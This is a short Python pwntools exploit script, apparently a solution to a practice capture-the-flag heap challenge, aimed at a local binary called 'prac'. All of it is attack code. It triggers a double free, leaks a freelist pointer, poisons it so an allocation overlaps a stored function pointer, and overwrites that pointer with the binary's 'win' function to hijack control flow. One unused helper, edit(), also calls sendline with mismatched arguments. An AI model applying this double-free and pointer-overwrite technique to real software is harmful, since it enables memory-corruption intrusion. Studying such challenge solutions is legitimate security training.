from pwn import *

p = process('./prac')
elf = ELF('./prac')

def menu():
    p.recvuntil(b'Choice: ')

def make(index,name):
    log.info('Make: {}'.format(index))
    p.sendline(b'a')
    p.sendlineafter(b'Clone ID:', index, timeout=0.1)
    p.sendlineafter(b'Enter Name', name)
    menu()

def edit(index,name):
    log.info('Edit: {}'.format(index))
    p.sendline(b'c')
    p.sendline(b'Clone ID: ', index, timeout=0.1)
    p.sendlineafter(b'Enter Name', name)
    menu()

def kill(index):
    log.info('Kill: {}'.format(index))
    p.sendline(b'b')
    p.sendlineafter(b'Clone ID:', index)
    menu()

def view(index):
    log.info('View: {}'.format(index))
    p.sendline(b'd')
    p.sendlineafter(b'Clone ID: ', index, timeout=0.1)
    p.recvuntil(b'Name: ',timeout=0.1)
    result = p.recv(4)
    menu()
    return result

def hint(index):
    log.info('Hint: {}'.format(index))
    p.sendline(b'h')
    p.sendlineafter(b'Clone ID: ', index,timeout=0.1)
    return p.recvline()

menu()
make(b'0', b'AAAAAAAA')
make(b'1', b'a')

# double free bug
kill(b'0')
kill(b'1')
kill(b'0')

# leak the fd pointer
leak = u32(view(0))
log.critical('Leaked Pointer: {}'.format(hex(leak)))

# change fd pointer by 8 bytes to overlap with hint function pointer
log.critical('New Pointer: {}'.format(hex(leak+8)))
make(b'1', p32(leak+8))
make(b'2', '')

# allocate new chunk to overwrite hint pointer
make(b'3', p32(elf.symbols['win']))

log.critical(hint(2))
